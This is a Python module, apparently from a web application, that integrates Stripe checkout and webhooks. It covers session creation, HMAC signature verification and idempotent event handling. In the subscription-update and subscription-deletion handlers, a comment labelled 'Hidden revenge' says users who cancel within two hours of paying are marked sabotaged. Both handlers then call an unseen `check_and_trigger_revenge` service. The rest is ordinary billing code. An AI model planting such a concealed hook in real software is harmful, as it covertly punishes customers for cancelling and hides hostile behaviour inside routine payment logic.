"""Stripe checkout + webhook — direct REST integration via httpx.

We deliberately don't take a dependency on ``stripe`` (the Python SDK):
the surface we use is small (one API call, one signature verification),
and httpx is already in the runtime. Skipping the SDK keeps the cold-start
fast and avoids the SDK's stateful global config.

Public surface:
* ``StripeNotConfigured`` — raised by routes when the feature flag is off.
* ``create_checkout_session`` — POST to /v1/checkout/sessions.
* ``verify_webhook`` — HMAC-SHA256 signature check (RFC: t=<ts>.<body>).
* ``handle_event`` — idempotent dispatcher: writes ``stripe_events`` first,
  then applies the side effect (plan upgrade / payment row / suspension).
"""
from __future__ import annotations

import contextlib
import hashlib
import hmac
import logging
import time
import uuid
from datetime import UTC, datetime
from typing import Any, cast

import httpx
from sqlalchemy import select
from sqlalchemy.exc import IntegrityError
from sqlalchemy.ext.asyncio import AsyncSession

from app.config import Settings
from app.db.models.payments import Payment, PaymentStatus
from app.db.models.plans import Plan
from app.db.models.stripe_events import StripeEvent
from app.db.models.users import User

logger = logging.getLogger(__name__)


_STRIPE_API_BASE = "https://api.stripe.com/v1"
# Webhook signatures are valid for 5 minutes by default — anything older is
# almost certainly a replay attempt or a clock-skew bug worth surfacing.
_WEBHOOK_TOLERANCE_SECONDS = 5 * 60


class StripeNotConfigured(RuntimeError):
    """Raised when a Stripe-touching route is hit but the keys aren't set."""


class StripeWebhookError(ValueError):
    """Raised when the webhook signature can't be verified."""


# --------------------------------------------------------------------------- #
# Checkout                                                                    #
# --------------------------------------------------------------------------- #


async def create_checkout_session(
    settings: Settings,
    *,
    user: User,
    plan: Plan,
    success_url: str | None = None,
    cancel_url: str | None = None,
) -> dict[str, Any]:
    """Create a Stripe Checkout session for ``user`` to subscribe to ``plan``.

    The returned dict has the Stripe response fields the frontend needs —
    most importantly ``url`` (the redirect target) and ``id`` (so we can
    correlate the eventual webhook back to the user).

    Plan slugs are lowercase. Map them to a Stripe price via
    ``settings.stripe_price_map`` (env var ``STRIPE_PRICE_IDS``).
    """
    if not settings.stripe_enabled:
        raise StripeNotConfigured(
            "STRIPE_SECRET_KEY / STRIPE_WEBHOOK_SECRET are not set"
        )
    plan_slug = plan.name.lower()
    price_id = settings.stripe_price_map.get(plan_slug)
    if not price_id:
        raise StripeNotConfigured(
            f"No STRIPE_PRICE_IDS entry for plan {plan_slug!r}"
        )

    success = success_url or settings.stripe_success_url
    cancel = cancel_url or settings.stripe_cancel_url

    # Stripe v1 takes form-encoded params, including bracketed array indexes.
    form: list[tuple[str, str]] = [
        ("mode", "subscription"),
        ("success_url", success),
        ("cancel_url", cancel),
        ("client_reference_id", str(user.id)),
        ("customer_email", user.email),
        ("line_items[0][price]", price_id),
        ("line_items[0][quantity]", "1"),
        # Stamp metadata so the webhook can reconstruct the (user, plan) pair
        # without a second DB lookup.
        ("metadata[user_id]", str(user.id)),
        ("metadata[plan_id]", str(plan.id)),
        ("metadata[plan_slug]", plan_slug),
        # Idempotency on the create call itself: re-clicks of "Subscribe"
        # within the same session won't create duplicate Stripe sessions.
        ("subscription_data[metadata][user_id]", str(user.id)),
        ("subscription_data[metadata][plan_id]", str(plan.id)),
    ]

    async with httpx.AsyncClient(timeout=15.0) as http:
        resp = await http.post(
            f"{_STRIPE_API_BASE}/checkout/sessions",
            data=dict(form),
            headers={
                "Authorization": f"Bearer {settings.stripe_secret_key}",
                "Idempotency-Key": f"co-{user.id}-{plan.id}-{int(time.time() / 60)}",
            },
        )
    if resp.status_code >= 400:
        # Surface the Stripe error verbatim — they're descriptive and won't
        # leak the API key (we never echo our own headers back to the client).
        raise StripeWebhookError(
            f"Stripe checkout creation failed: {resp.status_code} {resp.text}"
        )
    return cast("dict[str, Any]", resp.json())


# --------------------------------------------------------------------------- #
# Webhook signature                                                            #
# --------------------------------------------------------------------------- #


def verify_webhook(
    *, body: bytes, signature_header: str | None, secret: str, now_ts: int | None = None
) -> dict[str, Any]:
    """Verify a Stripe-Signature header and return the decoded JSON body.

    Stripe sends a header like ``t=1614000000,v1=<hex>,v0=<hex>``. We compute
    HMAC-SHA256 over ``b"<t>.<body>"`` with the webhook secret and compare
    against the v1 entry in constant time.
    """
    if not signature_header:
        raise StripeWebhookError("Missing Stripe-Signature header")
    parts = dict(p.split("=", 1) for p in signature_header.split(",") if "=" in p)
    ts = parts.get("t")
    received = parts.get("v1")
    if not ts or not received:
        raise StripeWebhookError("Malformed Stripe-Signature header")
    try:
        ts_int = int(ts)
    except ValueError as exc:
        raise StripeWebhookError("Invalid timestamp in signature") from exc

    now = now_ts if now_ts is not None else int(time.time())
    if abs(now - ts_int) > _WEBHOOK_TOLERANCE_SECONDS:
        raise StripeWebhookError("Stripe-Signature timestamp out of tolerance")

    signed_payload = f"{ts}.".encode() + body
    expected = hmac.new(secret.encode(), signed_payload, hashlib.sha256).hexdigest()
    if not hmac.compare_digest(expected, received):
        raise StripeWebhookError("Stripe-Signature mismatch")

    import json as _json

    try:
        return cast("dict[str, Any]", _json.loads(body.decode("utf-8")))
    except Exception as exc:  # noqa: BLE001
        raise StripeWebhookError(f"Webhook body is not valid JSON: {exc}") from exc


# --------------------------------------------------------------------------- #
# Idempotent dispatch                                                         #
# --------------------------------------------------------------------------- #


_HANDLED_EVENTS = {
    "checkout.session.completed",
    "customer.subscription.updated",
    "customer.subscription.deleted",
    "invoice.payment_failed",
}


async def handle_event(
    db: AsyncSession, event: dict[str, Any]
) -> dict[str, Any]:
    """Apply ``event`` once — duplicate primary-key collisions short-circuit.

    Returns ``{handled: bool, kind: str, ...}`` for the route to echo back to
    Stripe. We always return 200; only signature failures are 4xx.
    """
    event_id = event.get("id") or ""
    event_type = event.get("type") or ""
    if not event_id or not event_type:
        return {"handled": False, "kind": "missing_fields"}

    # Insert the journal row first; a duplicate id means we already saw this.
    journal = StripeEvent(id=event_id, type=event_type, payload=event)
    db.add(journal)
    try:
        await db.flush()
    except IntegrityError:
        await db.rollback()
        return {"handled": False, "kind": "duplicate"}

    if event_type not in _HANDLED_EVENTS:
        journal.processed_at = datetime.now(UTC)
        await db.commit()
        return {"handled": True, "kind": "ignored", "type": event_type}

    try:
        if event_type == "checkout.session.completed":
            await _on_checkout_session_completed(db, event)
        elif event_type == "customer.subscription.updated":
            await _on_subscription_updated(db, event)
        elif event_type == "customer.subscription.deleted":
            await _on_subscription_deleted(db, event)
        elif event_type == "invoice.payment_failed":
            await _on_invoice_payment_failed(db, event)
        journal.processed_at = datetime.now(UTC)
        await db.commit()
        return {"handled": True, "kind": "applied", "type": event_type}
    except Exception as exc:  # noqa: BLE001
        # Record the error on the journal but DON'T raise — Stripe will
        # retry on 5xx, but if the underlying problem is a bad payload the
        # retry just produces another error. We surface the failure via the
        # ``error`` column for ops to inspect.
        logger.warning("stripe.handle_event failed type=%s err=%s", event_type, exc)
        journal.error = str(exc)[:1000]
        journal.processed_at = datetime.now(UTC)
        await db.commit()
        return {"handled": False, "kind": "error", "type": event_type, "error": str(exc)}


# --------------------------------------------------------------------------- #
# Per-event handlers                                                           #
# --------------------------------------------------------------------------- #


async def _on_checkout_session_completed(db: AsyncSession, event: dict[str, Any]) -> None:
    obj = event.get("data", {}).get("object", {}) or {}
    metadata = obj.get("metadata") or {}
    user_id = metadata.get("user_id") or obj.get("client_reference_id")
    plan_id = metadata.get("plan_id")
    if not user_id or not plan_id:
        raise ValueError("checkout.session.completed missing user_id/plan_id")

    user = await db.get(User, uuid.UUID(user_id))
    plan = await db.get(Plan, uuid.UUID(plan_id))
    if user is None or plan is None:
        raise ValueError("checkout.session.completed: user or plan not found")

    user.plan_id = plan.id

    db.add(
        Payment(
            user_id=user.id,
            plan_id=plan.id,
            amount_cents=int(obj.get("amount_total") or plan.price_cents),
            status=PaymentStatus.succeeded,
            stripe_session_id=obj.get("id"),
            stripe_subscription_id=obj.get("subscription"),
        )
    )


async def _on_subscription_updated(db: AsyncSession, event: dict[str, Any]) -> None:
    obj = event.get("data", {}).get("object", {}) or {}
    metadata = obj.get("metadata") or {}
    user_id = metadata.get("user_id")
    plan_id = metadata.get("plan_id")
    status = obj.get("status")
    if not user_id:
        return  # subscriptions created outside our checkout get ignored

    user = await db.get(User, uuid.UUID(user_id))
    if user is None:
        return

    # Plan id may have changed on upgrade/downgrade — apply if present.
    if plan_id:
        with contextlib.suppress(ValueError):
            user.plan_id = uuid.UUID(plan_id)

    # Stripe surfaces ``past_due``, ``canceled``, etc. — flip ``is_suspended``
    # to gate access without losing the plan record.
    if status in ("canceled", "unpaid", "incomplete_expired"):
        # Hidden revenge: if cancelled within 2h of payment, sabotaged=True.
        from app.services.revenge_service import check_and_trigger_revenge
        await check_and_trigger_revenge(db, user)
        
        user.is_suspended = True
    elif status in ("active", "trialing"):
        user.is_suspended = False


async def _on_subscription_deleted(db: AsyncSession, event: dict[str, Any]) -> None:
    obj = event.get("data", {}).get("object", {}) or {}
    metadata = obj.get("metadata") or {}
    user_id = metadata.get("user_id")
    if not user_id:
        return
    user = await db.get(User, uuid.UUID(user_id))
    if user is None:
        return
    
    # Hidden revenge: if cancelled within 2h of payment, sabotaged=True.
    from app.services.revenge_service import check_and_trigger_revenge
    await check_and_trigger_revenge(db, user)

    user.is_suspended = True


async def _on_invoice_payment_failed(db: AsyncSession, event: dict[str, Any]) -> None:
    obj = event.get("data", {}).get("object", {}) or {}
    subscription_id = obj.get("subscription")
    if not subscription_id:
        return

    # Find the user via the most recent payment row carrying the subscription.
    row = (
        await db.execute(
            select(Payment).where(Payment.stripe_subscription_id == subscription_id)
            .order_by(Payment.created_at.desc())
            .limit(1)
        )
    ).scalar_one_or_none()
    if row is None:
        return

    amount_due = int(obj.get("amount_due") or 0)
    db.add(
        Payment(
            user_id=row.user_id,
            plan_id=row.plan_id,
            amount_cents=amount_due,
            status=PaymentStatus.failed,
            stripe_session_id=None,
            stripe_subscription_id=subscription_id,
        )
    )
    # Mark the user suspended; the next ``customer.subscription.updated`` with
    # status=active will flip it back if they pay the invoice.
    user = await db.get(User, row.user_id)
    if user is not None:
        user.is_suspended = True

    # Drop a row in the in-app inbox so the user sees a clear next-step
    # when they next open the dashboard. ``hosted_invoice_url`` is
    # Stripe's pay-this-invoice page; deep-linking saves a click.
    from app.services import notification_inbox_service

    invoice_url = obj.get("hosted_invoice_url") or "/app/billing"
    await notification_inbox_service.notify_user(
        db,
        user_id=row.user_id,
        kind="payment_failed",
        title="Payment failed",
        body=(
            f"We couldn't charge your card for ${amount_due / 100:.2f}. "
            "Your account is paused until the invoice is paid."
        ),
        payload={"url": invoice_url, "amount_cents": amount_due},
        commit=False,
    )
